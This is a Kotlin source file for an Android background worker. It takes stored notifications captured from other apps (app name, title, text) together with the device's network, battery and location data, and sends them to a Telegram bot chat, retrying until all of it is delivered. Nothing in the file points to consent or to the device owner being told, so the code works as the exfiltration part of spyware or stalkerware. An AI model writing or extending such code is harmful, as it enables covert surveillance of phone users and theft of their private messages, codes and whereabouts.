package com.example.lta

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class DataUploadWorker(appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {

    private val TAG = "DataUploadWorker"
    private lateinit var notificationDao: NotificationDao
    private lateinit var telegramBotApi: TelegramBotApi
    private lateinit var deviceDataManager: DeviceDataManager

    // TODO: Replace with your actual bot token and chat ID, ideally from a secure source
    private val BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
    private val CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"

    override suspend fun doWork(): Result {
        notificationDao = NotificationDatabase.getDatabase(applicationContext).notificationDao()
        telegramBotApi = TelegramBotApi(BOT_TOKEN, CHAT_ID)
        deviceDataManager = DeviceDataManager(applicationContext)

        Log.d(TAG, "Starting data upload work...")

        return withContext(Dispatchers.IO) {
            // 1. Send unsent notifications
            val unsentNotifications = notificationDao.getUnsentNotifications()
            unsentNotifications.forEach { notification ->
                val message = "Unsent Notification:\nApp: ${notification.packageName}\nTitle: ${notification.title ?: "N/A"}\nText: ${notification.text ?: "N/A"}\nTime: ${java.util.Date(notification.postTime)}"
                val success = telegramBotApi.sendMessage(message)
                if (success) {
                    notification.isSent = true
                    notificationDao.update(notification)
                    notificationDao.delete(notification.id)
                    Log.d(TAG, "Unsent notification sent and removed from DB: ${notification.packageName}")
                } else {
                    Log.e(TAG, "Failed to send unsent notification to Telegram: ${notification.packageName}")
                }
            }

            // 2. Send device info
            val networkInfo = deviceDataManager.getNetworkInfo()
            val batteryInfo = deviceDataManager.getBatteryInfo()
            val locationInfo = deviceDataManager.getLocationInfo()

            val deviceInfoMessage = "Device Info:\nNetwork: $networkInfo\nBattery: $batteryInfo\nLocation: $locationInfo"
            val deviceInfoSuccess = telegramBotApi.sendMessage(deviceInfoMessage)

            if (deviceInfoSuccess) {
                Log.d(TAG, "Device info sent to Telegram.")
            } else {
                Log.e(TAG, "Failed to send device info to Telegram.")
            }

            // Decide on the result of the work
            if (unsentNotifications.all { it.isSent } && deviceInfoSuccess) {
                Result.success()
            } else {
                // If some notifications failed to send or device info failed, retry
                Result.retry()
            }
        }
    }
} 